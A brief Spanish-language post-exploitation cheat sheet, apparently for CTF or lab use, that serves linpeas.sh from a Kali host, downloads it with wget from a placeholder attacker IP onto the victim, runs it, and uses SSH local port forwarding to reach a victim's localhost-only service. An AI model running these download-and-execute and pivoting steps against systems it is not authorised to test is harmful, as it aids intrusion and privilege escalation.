
```
# En Kali
python3 -m http.server 8000
```

```
#maquina victima
wget http://IP_ATACANTE:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

```
cd /tmp
./linpeas.sh
```

### Servicio abierto

#### SSH
si quieres ver el contenido de un puerto que esta corriendo de forma local en tu maquina victima hace un redireccionamiento de puertos : 

TODO EN MI KALI

```
ssh -L 8000:127.0.0.1:8000 usuario@IP_VICTIMA
```

```
http://localhost:8000
```